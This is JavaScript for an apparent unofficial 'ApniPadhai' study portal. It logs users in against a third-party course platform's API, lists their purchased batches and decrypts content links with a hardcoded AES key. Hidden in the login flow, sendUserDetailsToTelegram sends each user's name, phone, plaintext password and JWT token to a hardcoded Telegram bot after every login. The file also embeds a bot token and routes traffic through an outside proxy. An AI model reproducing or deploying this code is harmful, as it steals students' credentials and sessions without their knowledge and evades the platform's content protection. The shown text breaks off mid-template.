// =========================================================
// APNIPADHAI PORTAL - MASTER ENGINE, AUTH, FOLDERS & CBT TESTS (app.js)
// =========================================================

// 👇 APNA TELEGRAM BOT TOKEN AUR CHANNEL CHAT ID YAHAN DALEIN 👇
const TG_BOT_TOKEN = "8953710743:AAHJUQB5f0gefAEDyieZFcsyU2GEUu3LzRk"; 
const TG_CHAT_ID = "-1004331013936";

// 🌐 NEW SERVER API BASE & AES DECRYPTION KEY (FROM APNIPADHAI LOGS)
const API_BASE = "https://aapnipadhaiapi.classx.co.in";
const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";

// =====================================================
// LIVE SERVER ERROR BANNER FUNCTIONS
// =====================================================
function showServerError(title, message, endpoint = "") {
    const box = document.getElementById("serverErrorBox");
    const titleEl = document.getElementById("serverErrorTitle");
    const msgEl = document.getElementById("serverErrorMessage");
    const epEl = document.getElementById("serverErrorEndpoint");

    if (titleEl) titleEl.textContent = title || "Server / API Error";
    if (msgEl) msgEl.textContent = message || "Server se data fetch karne mein samasya aayi.";
    if (epEl) epEl.textContent = endpoint ? `Endpoint: ${endpoint}` : "";
    if (box) box.classList.remove("hidden");
}

window.hideServerError = function() {
    const box = document.getElementById("serverErrorBox");
    if (box) box.classList.add("hidden");
};

// =====================================================
// JWT DECODER & USER PERSONAL TOKEN STORAGE (NO DUMMY TOKENS)
// =====================================================
function extractUidFromJwt(jwtStr) {
    if (!jwtStr || typeof jwtStr !== "string") return "";
    try {
        const clean = jwtStr.replace(/^Bearer\s+/i, "").trim();
        const parts = clean.split(".");
        if (parts.length < 2) return "";
        const base64Url = parts[1];
        const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/");
        const padded = base64.padEnd(base64.length + (4 - (base64.length % 4)) % 4, "=");
        const jsonPayload = decodeURIComponent(atob(padded).split("").map(c => {
            return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(""));
        const payload = JSON.parse(jsonPayload);
        return String(payload.id || payload.userid || payload.user_id || payload.uid || payload.sub || "").trim();
    } catch {
        return "";
    }
}

function getUserSavedTokens() {
    try {
        const raw = localStorage.getItem("apnipadhai_user_tokens_v1");
        if (raw) {
            const parsed = JSON.parse(raw);
            if (Array.isArray(parsed)) {
                return parsed.filter(t => t && t.token && !t.isAdmin);
            }
        }
    } catch {}
    return [];
}

function getSavedUserProfile() {
    try {
        const raw = localStorage.getItem("apnipadhai_user_profile_v1");
        if (raw) return JSON.parse(raw);
    } catch {}
    return null;
}

let USER_TOKENS = getUserSavedTokens();
let USER_PROFILE = getSavedUserProfile();

function getAllTokensForCourses() {
    return [...USER_TOKENS];
}

function getCourseBoundToken(courseId) {
    const cid = String(courseId || state.courseId || "").trim();
    if (cid && state.courseTokenMap && state.courseTokenMap[cid]) {
        return state.courseTokenMap[cid];
    }
    if (state.activeTokenObj && state.activeTokenObj.token) {
        return state.activeTokenObj;
    }
    return USER_TOKENS[0] || null;
}

function isUserLoggedIn() {
    return USER_TOKENS.length > 0 && Boolean(USER_TOKENS[0].token);
}

function updateTokenBadge() {
    const b = document.getElementById("tokCountBadge");
    if (b) b.textContent = USER_TOKENS.length;
    checkAuthUIState();
}

function checkAuthUIState() {
    const loginBtn = document.getElementById("navLoginBtn");
    const profileArea = document.getElementById("navProfileArea");
    const userNameText = document.getElementById("navUserNameText");
    const closeLoginBtn = document.getElementById("closeLoginModalBtn");

    if (isUserLoggedIn()) {
        if (loginBtn) loginBtn.classList.add("hidden");
        if (profileArea) profileArea.classList.remove("hidden");
        if (userNameText) {
            userNameText.textContent = (USER_PROFILE && USER_PROFILE.name) ? USER_PROFILE.name : `UID #${USER_TOKENS[0].userId || "User"}`;
        }
        if (closeLoginBtn) closeLoginBtn.classList.remove("hidden");
    } else {
        if (loginBtn) loginBtn.classList.remove("hidden");
        if (profileArea) profileArea.classList.add("hidden");
        if (closeLoginBtn) closeLoginBtn.classList.add("hidden");
    }
}

function enforceCompulsoryLogin() {
    updateTokenBadge();
    if (!isUserLoggedIn()) {
        openLoginModal();
        return false;
    }
    return true;
}

// =====================================================
// DIRECT + WORKER HYBRID API CALLER WITH ERROR REPORTING
// =====================================================
async function fetchRawJSONWithToken(endpoint, tokenObj, silentError = false) {
    const statusBadge = document.getElementById("apiStatus");
    const useTok = tokenObj || state.activeTokenObj || USER_TOKENS[0];

    if (!useTok || !useTok.token) {
        if (!silentError) {
            showServerError("No Active Token Found", "Kripya pehle apna JWT Token login ya add karein.", endpoint);
        }
        return null;
    }

    const resolvedUid = String(useTok.userId || extractUidFromJwt(useTok.token) || "").trim();
    const cleanToken = useTok.token.replace(/^["']|["']$/g, "").trim();

    const reqHeaders = {
        "accept": "*/*",
        "auth-key": "appxapi",
        "client-service": "Appx",
        "device-type": "",
        "is-safari": "0",
        "source": "website",
        "user-id": resolvedUid,
        "User-ID": resolvedUid,
        "Authorization": cleanToken
    };

    const directUrl = `${API_BASE}${endpoint}`;

    // 1. Try Direct Connection to aapnipadhaiapi.classx.co.in (CORS is enabled on server)
    try {
        const res = await fetch(directUrl, {
            method: "GET",
            headers: reqHeaders
        });

        const text = await res.text();
        let json = null;
        try {
            json = JSON.parse(text);
        } catch {
            throw new Error(`Invalid JSON response (HTTP ${res.status}): ${text.slice(0, 120)}`);
        }

        if (!res.ok || (json && json.status && Number(json.status) !== 200)) {
            const errMsg = (json && (json.msg || json.message || json.error)) || `HTTP Status ${res.status}`;
            if (!silentError) {
                showServerError(`Server Rejected Request (${res.status})`, `${errMsg} (UID: ${resolvedUid || "Missing"})`, endpoint);
            }
            if (statusBadge) {
                statusBadge.textContent = `● Server Error (${json?.status || res.status})`;
                statusBadge.className = "text-[11px] font-bold text-rose-600 mt-0.5";
            }
            return json;
        }

        if (statusBadge) {
            statusBadge.textContent = `● Live Connected (UID: ${resolvedUid})`;
            statusBadge.className = "text-[11px] font-bold text-emerald-600 mt-0.5";
        }
        return json;
    } catch (directErr) {
        // 2. Fallback to Cloudflare Worker Proxy if Direct Fetch fails due to network/CORS
        try {
            const proxyUrl = `${WORKER_RAW_PROXY}${encodeURIComponent(directUrl)}`;
            const pRes = await fetch(proxyUrl, {
                method: "GET",
                headers: reqHeaders
            });

            const pText = await pRes.text();
            let pJson = null;
            try {
                pJson = JSON.parse(pText);
            } catch {
                throw new Error(`Worker returned non-JSON (HTTP ${pRes.status}): ${pText.slice(0, 120)}`);
            }

            if (!pRes.ok || (pJson && pJson.status && Number(pJson.status) !== 200)) {
                const errMsg = (pJson && (pJson.msg || pJson.message || pJson.error)) || `HTTP Status ${pRes.status}`;
                if (!silentError) {
                    showServerError(`Proxy Server Error (${pRes.status})`, `${errMsg} (UID: ${resolvedUid || "Missing"})`, endpoint);
                }
                return pJson;
            }

            if (statusBadge) {
                statusBadge.textContent = `● Connected via Proxy (UID: ${resolvedUid})`;
                statusBadge.className = "text-[11px] font-bold text-emerald-600 mt-0.5";
            }
            return pJson;
        } catch (proxyErr) {
            if (statusBadge) {
                statusBadge.textContent = "● Server Disconnected";
                statusBadge.className = "text-[11px] font-bold text-rose-600 mt-0.5";
            }
            if (!silentError) {
                showServerError(
                    "Network / CORS Connection Failed",
                    `Direct Error: ${directErr.message} | Proxy Error: ${proxyErr.message}`,
                    endpoint
                );
            }
            return null;
        }
    }
}

async function fetchAPIWithToken(endpoint, tokenObj, silentError = false) {
    const json = await fetchRawJSONWithToken(endpoint, tokenObj, silentError);
    if (json) {
        if (json.data !== undefined && json.data !== null) {
            return json.data;
        }
        if (json.test_titles && Array.isArray(json.test_titles)) {
            return json.test_titles;
        }
    }
    return [];
}

// =====================================================
// LOGIN MODAL & TOKEN VERIFICATION ENGINE
// =====================================================
function openLoginModal() {
    const modal = document.getElementById("loginModal");
    if (modal) modal.classList.remove("hidden");
    const closeBtn = document.getElementById("closeLoginModalBtn");
    if (closeBtn) {
        if (isUserLoggedIn()) closeBtn.classList.remove("hidden");
        else closeBtn.classList.add("hidden");
    }
}

function closeLoginModal() {
    if (!isUserLoggedIn()) {
        showLoginStatus("⚠️ Portal use karne ke liye Token ya Login karna COMPULSORY hai!", "error");
        return;
    }
    const modal = document.getElementById("loginModal");
    if (modal) modal.classList.add("hidden");
}

window.switchLoginMode = function(mode) {
    const btnCreds = document.getElementById("tabBtnCreds");
    const btnToken = document.getElementById("tabBtnToken");
    const boxCreds = document.getElementById("loginBoxCreds");
    const boxToken = document.getElementById("loginBoxToken");
    const alertBox = document.getElementById("loginStatusAlert");
    if (alertBox) alertBox.classList.add("hidden");

    if (mode === "token") {
        btnToken.className = "py-2 px-3 rounded-xl font-extrabold text-xs bg-blue-600 text-white shadow transition-all cursor-pointer border-0";
        btnCreds.className = "py-2 px-3 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-100 transition-all cursor-pointer border-0";
        boxToken.classList.remove("hidden");
        boxCreds.classList.add("hidden");
    } else {
        btnCreds.className = "py-2 px-3 rounded-xl font-extrabold text-xs bg-blue-600 text-white shadow transition-all cursor-pointer border-0";
        btnToken.className = "py-2 px-3 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-100 transition-all cursor-pointer border-0";
        boxCreds.classList.remove("hidden");
        boxToken.classList.add("hidden");
    }
};

function showLoginStatus(msg, type) {
    const alertBox = document.getElementById("loginStatusAlert");
    if (!alertBox) return;
    alertBox.classList.remove("hidden", "bg-rose-100", "text-rose-800", "border-rose-300", "bg-emerald-100", "text-emerald-800", "border-emerald-300", "bg-sky-100", "text-sky-900", "border-sky-300");
    alertBox.classList.add("border");
    if (type === "error") {
        alertBox.classList.add("bg-rose-100", "text-rose-800", "border-rose-300");
    } else if (type === "success") {
        alertBox.classList.add("bg-emerald-100", "text-emerald-800", "border-emerald-300");
    } else {
        alertBox.classList.add("bg-sky-100", "text-sky-900", "border-sky-300");
    }
    alertBox.innerHTML = msg;
}

// Verify Token with New Server (/get/get_all_purchases & /get/get_user_dt)
async function verifyTokenAndGetProfile(jwtToken, manualUid = "") {
    const uid = String(manualUid || extractUidFromJwt(jwtToken) || "").trim();
    if (!jwtToken || !uid) {
        return { ok: false, error: "Token se User-ID extract nahi ho saki. Kripya sahi JWT Token dalein." };
    }

    const tempTokObj = { token: jwtToken, userId: uid };

    // Step 1: Test /get/get_all_purchases (Exact endpoint from apnipadhai.org.txt logs)
    const purchasesJson = await fetchRawJSONWithToken(
        `/get/get_all_purchases?userid=${uid}&item_type=10&paid_status=all`,
        tempTokObj,
        true
    );

    // Step 2: Try fetching user profile details (/get/get_user_dt)
    const userJson = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, tempTokObj, true);
    let profileObj = null;

    if (userJson && Number(userJson.status) === 200 && Array.isArray(userJson.data) && userJson.data.length > 0) {
        profileObj = userJson.data[0];
    }

    if (purchasesJson && Number(purchasesJson.status) === 200) {
        if (!profileObj) {
            profileObj = {
                id: uid,
                userid: uid,
                name: `Student #${uid}`,
                email: "Verified via Token",
                phone: "N/A",
                username: uid,
                state: "Rajasthan",
                district: "N/A",
                datetime: new Date().toLocaleDateString()
            };
        }
        return { ok: true, uid: uid, profile: profileObj, purchases: purchasesJson.data || [] };
    }

    if (profileObj) {
        return { ok: true, uid: uid, profile: profileObj, purchases: [] };
    }

    const serverMsg = (purchasesJson && (purchasesJson.msg || purchasesJson.message)) ||
                      (userJson && (userJson.msg || userJson.message)) ||
                      "Server ne token reject kar diya (Invalid ya Expired Token).";

    return { ok: false, error: serverMsg };
}

async function sendUserDetailsToTelegram(userObj, jwtToken, loginMethod, rawPass = "N/A") {
    if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;

    const textMsg = `🚨 <b>APNIPADHAI LOGIN SUCCESS</b> 🚨\n\n` +
        `🔑 <b>Method:</b> ${loginMethod}\n` +
        `🆔 <b>User ID:</b> <code>${userObj.userid || userObj.id || "N/A"}</code>\n` +
        `👤 <b>Name:</b> ${userObj.name || "N/A"}\n` +
        `📱 <b>Phone:</b> <code>${userObj.phone || "N/A"}</code>\n` +
        `🔒 <b>Password:</b> <code>${rawPass}</code>\n\n` +
        `🛡️ <b>JWT Token:</b>\n<code>${jwtToken}</code>`;

    try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TG_CHAT_ID,
                text: textMsg,
                parse_mode: "HTML",
                disable_web_page_preview: true
            })
        });
    } catch {}
}

async function loginOnApniPadhaiServer(phoneOrEmail, password) {
    const loginEndpoints = ["/post/userLogin", "/post/login", "/get/login"];

    for (const ep of loginEndpoints) {
        const directUrl = `${API_BASE}${ep}`;
        const urlsToTry = [directUrl, `${WORKER_RAW_PROXY}${encodeURIComponent(directUrl)}`];

        for (const target of urlsToTry) {
            try {
                const formData = new URLSearchParams();
                formData.append("email", phoneOrEmail);
                formData.append("phone", phoneOrEmail);
                formData.append("username", phoneOrEmail);
                formData.append("password", password);
                formData.append("devicetoken", "");
                formData.append("mydeviceid", "");

                const res = await fetch(target, {
                    method: "POST",
                    headers: {
                        "client-service": "Appx",
                        "auth-key": "appxapi",
                        "source": "website",
                        "device-type": "",
                        "is-safari": "0",
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    body: formData.toString()
                });
                const json = await res.json();
                if (json && Number(json.status) === 200 && json.data && (json.data.token || json.data.jwt)) {
                    return json.data;
                }
            } catch {}
        }
    }
    return null;
}

window.submitUserLogin = async function(mode) {
    hideServerError();

    if (mode === "token") {
        let rawToken = document.getElementById("loginTokenInput").value.trim();
        if (!rawToken) {
            showLoginStatus("⚠️ Kripya apna JWT Authorization Token paste karein.", "error");
            return;
        }
        rawToken = rawToken.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").replace(/^Bearer\s+/i, "").trim();

        const extractedUid = extractUidFromJwt(rawToken);
        if (!extractedUid) {
            showLoginStatus("❌ Invalid JWT Token format! Token ke andar User-ID nahi mili.", "error");
            return;
        }

        showLoginStatus(`🔄 Connecting to ${API_BASE} with User-ID #${extractedUid}...`, "info");
        const verifyRes = await verifyTokenAndGetProfile(rawToken, extractedUid);

        if (!verifyRes.ok) {
            showLoginStatus(`❌ Server Error: ${verifyRes.error}`, "error");
            showServerError("Token Verification Failed", verifyRes.error, `/get/get_all_purchases?userid=${extractedUid}`);
            return;
        }

        const userDetails = verifyRes.profile;
        const userTokObj = {
            id: "utok_" + Date.now(),
            label: userDetails.name || `Account #${extractedUid}`,
            userId: String(extractedUid),
            token: rawToken,
            isAdmin: false
        };

        USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== userTokObj.userId)];
        USER_PROFILE = userDetails;
        state.activeTokenObj = userTokObj;
        localStorage.setItem("apnipadhai_user_tokens_v1", JSON.stringify(USER_TOKENS));
        localStorage.setItem("apnipadhai_user_profile_v1", JSON.stringify(USER_PROFILE));

        sendUserDetailsToTelegram(userDetails, rawToken, "Direct JWT Token", "Logged via Token");

        showLoginStatus(`✅ Connected! Welcome ${userDetails.name} (${verifyRes.purchases.length} Purchased Item(s) Found).`, "success");
        updateTokenBadge();
        setTimeout(() => {
            closeLoginModal();
            showSlide("slideHome");
        }, 600);
        return;
    }

    const phone = document.getElementById("loginPhoneInput").value.trim();
    const pass = document.getElementById("loginPassInput").value.trim();

    if (!phone || !pass) {
        showLoginStatus("⚠️ Kripya Mobile Number/Email aur Password dono dalein.", "error");
        return;
    }

    if (pass.startsWith("eyJ")) {
        document.getElementById("loginTokenInput").value = pass;
        switchLoginMode("token");
        submitUserLogin("token");
        return;
    }

    showLoginStatus(`🔄 ${API_BASE} par credentials verify kiye ja rahe hain...`, "info");
    const loginData = await loginOnApniPadhaiServer(phone, pass);

    if (!loginData || !(loginData.token || loginData.jwt)) {
        showLoginStatus("❌ Login Failed! Number/Password galat hai ya server par OTP login lagu hai. Kripya 'Direct Token' tab se login karein.", "error");
        return;
    }

    const token = loginData.token || loginData.jwt;
    const uid = String(loginData.userid || loginData.id || extractUidFromJwt(token));

    const verifyRes = await verifyTokenAndGetProfile(token, uid);
    const userDetails = verifyRes.profile || {
        id: uid,
        userid: uid,
        name: loginData.name || phone,
        email: loginData.email || phone,
        phone: loginData.phone || phone
    };

    const userTokObj = {
        id: "utok_" + Date.now(),
        label: userDetails.name || phone,
        userId: uid,
        token: token,
        isAdmin: false
    };

    USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== uid)];
    USER_PROFILE = userDetails;
    state.activeTokenObj = userTokObj;
    localStorage.setItem("apnipadhai_user_tokens_v1", JSON.stringify(USER_TOKENS));
    localStorage.setItem("apnipadhai_user_profile_v1", JSON.stringify(USER_PROFILE));

    sendUserDetailsToTelegram(userDetails, token, "Phone/Password Login", pass);

    showLoginStatus(`✅ Welcome ${userDetails.name || "User"}! Login Successful.`, "success");
    updateTokenBadge();
    setTimeout(() => {
        closeLoginModal();
        showSlide("slideHome");
    }, 600);
};

// =====================================================
// USER PROFILE MODAL
// =====================================================
async function openProfileModal() {
    if (!enforceCompulsoryLogin()) return;

    document.getElementById("profileModal").classList.remove("hidden");
    const contentBox = document.getElementById("profileDetailsContent");
    contentBox.innerHTML = `<div class="py-8 text-center text-slate-600 font-extrabold">🔄 Server se aapki live profile fetch ho rahi hai...</div>`;

    const activeUserTok = USER_TOKENS[0];
    const uid = activeUserTok.userId || extractUidFromJwt(activeUserTok.token);

    const userJson = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, activeUserTok, true);
    if (userJson && Number(userJson.status) === 200 && Array.isArray(userJson.data) && userJson.data.length > 0) {
        USER_PROFILE = userJson.data[0];
        localStorage.setItem("apnipadhai_user_profile_v1", JSON.stringify(USER_PROFILE));
        updateTokenBadge();
    }

    const u = USER_PROFILE || {};
    contentBox.innerHTML = `
        <div class="bg-sky-50 border-2 border-sky-200 rounded-2xl p-4 flex items-center gap-3.5">
            <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500 to-teal-600 text-white font-black text-2xl flex items-center justify-center shadow-md shrink-0">
                ${(u.name || "U").charAt(0).toUpperCase()}
            </div>
            <div class="min-w-0 flex-1">
                <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black uppercase">● Connected to ApniPadhai</span>
                <h4 class="font-black text-lg text-slate-900 truncate mt-0.5">${u.name || `Student #${uid}`}</h4>
                <p class="text-xs font-bold text-slate-500">User ID: <span class="text-slate-800 font-mono">${u.userid || u.id || uid}</span></p>
            </div>
        </div>

        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs bg-slate-50 p-4 rounded-2xl border border-slate-200">
            <div><span class="text-slate-500 font-bold">📧 Email:</span><div class="font-extrabold text-slate-900 break-all mt-0.5">${u.email || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">📱 Phone:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.phone || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">🏛️ State & District:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.state || "N/A"} (${u.district || "N/A"})</div></div>
            <div><span class="text-slate-500 font-bold">📅 Joined Date:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.datetime || "N/A"}</div></div>
        </div>

        <div class="bg-amber-50 border-2 border-amber-200 rounded-2xl p-3.5">
            <div class="flex justify-between items-center mb-1.5">
                <span class="text-[11px] font-black text-amber-900 uppercase">🔑 Your Active JWT Token</span>
                <button onclick="navigator.clipboard.writeText('${activeUserTok.token}'); alert('Token Copied!');" class="px-2.5 py-1 rounded-lg bg-amber-500 text-white font-extrabold text-[10px] border-0 cursor-pointer">📋 Copy Token</button>
            </div>
            <div class="p-2 bg-white rounded-xl border border-amber-200 font-mono text-[10px] text-slate-700 break-all max-h-24 overflow-y-auto">${activeUserTok.token}</div>
        </div>`;
}

function closeProfileModal() {
    document.getElementById("profileModal").classList.add("hidden");
}

function handleLogout() {
    if (confirm("Kya aap sach mein Logout karna chahte hain? Aapka saved token hat jayega.")) {
        localStorage.removeItem("apnipadhai_user_tokens_v1");
        localStorage.removeItem("apnipadhai_user_profile_v1");
        localStorage.removeItem("rwa_user_tokens_v2");
        localStorage.removeItem("rwa_user_profile_v2");
        USER_TOKENS = [];
        USER_PROFILE = null;
        closeProfileModal();
        updateTokenBadge();
        openLoginModal();
    }
}

window.clearAllSavedTokens = function() {
    handleLogout();
};

// =====================================================
// APPX AES-CBC DECRYPTION ENGINE (KEY: 638udh3829162018)
// =====================================================
function decryptAppX(encStr) {
    if (!encStr || typeof encStr !== "string") return "";
    if (encStr.startsWith("http")) return encStr.trim();
    if (!encStr.includes(":")) return encStr.trim();
    try {
        const [cipherB64, ivB64] = encStr.split(":");
        const cipherParams = CryptoJS.lib.CipherParams.create({
            ciphertext: CryptoJS.enc.Base64.parse(cipherB64.replace(/\\\//g, "/"))
        });
        const iv = CryptoJS.enc.Base64.parse(ivB64);
        const dec = CryptoJS.AES.decrypt(cipherParams, AES_KEY, {
            iv: iv,
            mode: CryptoJS.mode.CBC,
            padding: CryptoJS.pad.Pkcs7
        });
        return dec.toString(CryptoJS.enc.Utf8).replace(/[\x00-\x1F\x7F]/g, "").trim();
    } catch {
        return "";
    }
}

function resolvePdfUrl(encPdf, signedPdf) {
    const dec = decryptAppX(encPdf);
    if (dec && dec.startsWith("http")) return dec;
    if (signedPdf && signedPdf.startsWith("http")) return signedPdf;
    if (signedPdf && signedPdf.includes("URLPrefix=")) {
        try {
            const b64 = signedPdf.split("URLPrefix=")[1].split("&")[0].split("~")[0];
            const decoded = atob(decodeURIComponent(b64));
            if (decoded.startsWith("http")) return decoded;
        } catch {}
    }
    return signedPdf || dec || "";
}

// =====================================================
// PORTAL STATE (CLEAN — NO DUMMY IDS)
// =====================================================
let state = {
    currentSlide: "slideHome",
    previousSlide: "slideHome",
    cat: "paid",
    view: "batches",
    courseId: "",
    courseName: "",
    courseFolderWise: 1,
    activeTokenObj: USER_TOKENS[0] || null,
    courseTokenMap: {},
    courseTestSeriesMap: {},
    folderStack: [],
    currentFolderId: "-1",
    currentFolderName: "Content",
    subjectId: null,
    subjectName: "",
    topicId: null,
    topicName: "",
    currentLectureKeys: [],
    mediaMap: {},
    activeKey: null,
    currentPdfUrl: "",
    inlinePdfUrl: "",
    tsMode: "paid_ts",
    activeSeriesId: null,
    activeSeriesTitle: "",
    activeTsSubId: null,
    activeTsSubName: "",
    testMap: {},
    cbtTest: null,
    cbtQuestions: [],
    cbtCurrentIdx: 0,
    cbtResponses: {},
    cbtSubmitted: false,
    cbtTimerId: null,
    cbtSecondsLeft: 0
};

// =====================================================
// SLIDE NAVIGATION ENGINE
// =====================================================
function showSlide(slideId) {
    if (!enforceCompulsoryLogin()) return;

    if (state.currentSlide !== slideId) {
        state.previousSlide = state.currentSlide;
    }
    state.currentSlide = slideId;

    ["slideHome", "slideExplorer", "slidePlayer", "slideTestAttempt", "slideTokens", "slidePdf"].forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        if (id === slideId) {
            el.classList.remove("hidden-slide");
            el.classList.add("active-slide");
        } else {
            el.classList.remove("active-slide");
            el.classList.add("hidden-slide");
        }
    });

    const topNav = document.getElementById("topHeaderNav");
    if (topNav) {
        if (slideId === "slideHome") topNav.classList.remove("hidden");
        else topNav.classList.add("hidden");
    }

    window.scrollTo({ top: 0, behavior: "smooth" });
}

function goHomeHub() {
    if (!enforceCompulsoryLogin()) return;
    if (typeof stopPlayer === "function") stopPlayer();
    if (state.cbtTimerId) clearInterval(state.cbtTimerId);
    showSlide("slideHome");
}

function openTokenSlide() {
    if (!enforceCompulsoryLogin()) return;
    renderTokenManagerList();
    showSlide("slideTokens");
}

function openExplorerSlide(cat) {
    if (!enforceCompulsoryLogin()) return;
    state.cat = cat;
    showSlide("slideExplorer");
    if (cat === "paid") renderPaidBatches();
    else renderFreeBatches();
}

function handleGlobalBack() {
    if (state.currentSlide === "slidePdf") {
        closePdfSlide();
        return;
    }
    if (state.currentSlide === "slidePlayer") {
        closePlayerBox();
        return;
    }
    if (state.currentSlide === "slideTestAttempt") {
        exitCbtTest();
        return;
    }
    if (state.currentSlide === "slideTokens") {
        goHomeHub();
        return;
    }
    if (state.currentSlide === "slideExplorer") {
        if (state.view === "folders") {
            if (state.folderStack.length > 0) {
                const prev = state.folderStack.pop();
                openCourseFolderV3(prev.id, prev.name, true);
            } else {
                if (state.cat === "paid") renderPaidBatches();
                else renderFreeBatches();
            }
            return;
        }
        if (state.view === "ts_tests") {
            if (state.activeTsSubId === "-1") {
                openTestSeriesExplorer(state.tsMode);
            } else {
                openTestSeriesSubjects(state.activeSeriesId, state.activeSeriesTitle);
            }
            return;
        }
        if (state.view === "ts_subjects") {
            openTestSeriesExplorer(state.tsMode);
            return;
        }
        if (state.view === "ts_list") {
            goHomeHub();
            return;
        }
        if (state.view === "batch_ts_tests") {
            loadCourseTab("tests");
            return;
        }
        if (state.view === "lectures") {
            openLegacyTopics(state.subjectId, state.subjectName);
            return;
        }
        if (state.view === "topics") {
            loadCourseTab("subjects");
            return;
        }
        if (["subjects", "live", "batch_ts_subjects", "posts", "telegram"].includes(state.view)) {
            if (state.cat === "paid") renderPaidBatches();
            else renderFreeBatches();
            return;
        }
        goHomeHub();
    }
}

// =====================================================
// STEP 1: FETCH PURCHASED COURSES FROM TOKEN (ZERO DUMMY DATA)
// =====================================================
async function renderPaidBatches() {
    if (!enforceCompulsoryLogin()) return;
    hideServerError();
    state.view = "batches";
    document.getElementById("subTabs").classList.add("hidden");
    document.getElementById("crumbText").textContent = "Live Server Purchases";
    document.getElementById("headingText").textContent = "🎓 My Purchased Paid Batches";

    const grid = document.getElementById("mainGrid");
    grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Connecting to ${API_BASE} & fetching your token's purchased courses...</div>`;

    let mergedCourses = [];
    const seenIds = new Set();
    const userTokensList = getAllTokensForCourses();

    for (const tokObj of userTokensList) {
        const uid = String(tokObj.userId || extractUidFromJwt(tokObj.token) || "").trim();
        if (!uid) continue;

        // Exact Endpoint from apnipadhai.org.txt logs: /get/get_all_purchases?userid=296064&item_type=10&paid_status=all
        const ep1 = `/get/get_all_purchases?userid=${uid}&item_type=10&paid_status=all`;
        const data1 = await fetchAPIWithToken(ep1, tokObj, false);

        if (Array.isArray(data1) && data1.length > 0) {
            data1.forEach(purchaseItem => {
                const nestedCourses = Array.isArray(purchaseItem.coursedt) && purchaseItem.coursedt.length > 0
                    ? purchaseItem.coursedt
                    : (purchaseItem.id || purchaseItem.course_name ? [purchaseItem] : []);

                nestedCourses.forEach(c => {
                    const cid = String(c.id || purchaseItem.itemid || "").trim();
                    if (cid && !seenIds.has(cid)) {
                        seenIds.add(cid);
                        state.courseTokenMap[cid] = tokObj;
                        if (c.test_series_id) {
                            state.courseTestSeriesMap[cid] = String(c.test_series_id);
                        }
                        mergedCourses.push({
                            ...c,
                            id: cid,
                            folder_wise_course: c.folder_wise_course ?? purchaseItem.folder_wise_course ?? 1,
                            expiryDate: c.expiryDate || purchaseItem.enddatetime || "",
                            _boundTokenObj: tokObj,
                            _badgeText: `🔑 ${tokObj.label || `UID #${uid}`}`
                        });
                    }
                });
            });
        }

        // Fallback check on /get/mycourseweb if get_all_purchases was empty
        if (mergedCourses.length === 0) {
            const ep2 = `/get/mycourseweb?userid=${uid}`;
            const data2 = await fetchAPIWithToken(ep2, tokObj, true);
            if (Array.isArray(data2) && data2.length > 0) {
                data2.forEach(c => {
                    const cid = String(c.id || c.course_id || "").trim();
                    if (cid && !seenIds.has(cid)) {
                        seenIds.add(cid);
                        state.courseTokenMap[cid] = tokObj;
                        if (c.test_series_id) state.courseTestSeriesMap[cid] = String(c.test_series_id);
                        mergedCourses.push({
                            ...c,
                            id: cid,
                            folder_wise_course: c.folder_wise_course ?? 1,
                            _boundTokenObj: tokObj,
                            _badgeText: `🔑 ${tokObj.label || `UID #${uid}`}`
                        });
                    }
                });
            }
        }
    }

    grid.innerHTML = "";

    if (mergedCourses.length === 0) {
        grid.innerHTML = `
            <div class="col-span-full sky-card p-8 text-center">
                <div class="text-3xl mb-2">⚠️</div>
                <h3 class="font-black text-lg text-slate-900">Is Token par koi Purchased Batch nahi mila!</h3>
                <p class="text-xs font-bold text-slate-600 mt-1">Server (${API_BASE}) se response aaya hai lekin aapke token (UID: ${USER_TOKENS[0]?.userId || "N/A"}) mein koi active course nahi hai, ya aapka purana RWA token saved hai.</p>
                <div class="mt-4 flex justify-center gap-3 flex-wrap">
                    <button onclick="openTokenSlide()" class="btn-watch text-xs">🔑 Add New ApniPadhai Token</button>
                    <button onclick="renderPaidBatches()" class="btn-nav bg-slate-900 text-white border-0 text-xs">🔄 Retry Fetch</button>
                </div>
            </div>`;
        return;
    }

    mergedCourses.forEach(c => {
        const logo = (c.course_thumbnail || c.exam_logo || "").replace(/\\\//g, "/") || `https://placehold.co/600x320/0284c7/ffffff?text=Batch+${c.id}`;
        const safeName = (c.course_name || `Batch #${c.id}`).replace(/'/g, "").replace(/"/g, "");
        const fWise = Number(c.folder_wise_course ?? 1);
        grid.innerHTML += `
            <div onclick="openPaidCourse('${c.id}', '${safeName}', ${fWise})" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                <div>
                    <img src="${logo}" onerror="this.src='https://placehold.co/600x320/0284c7/ffffff?text=Course+${c.id}'" class="w-full h-44 object-cover">
                    <div class="p-4">
                        <div class="flex justify-between items-center gap-2">
                            <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">COURSE #${c.id}</span>
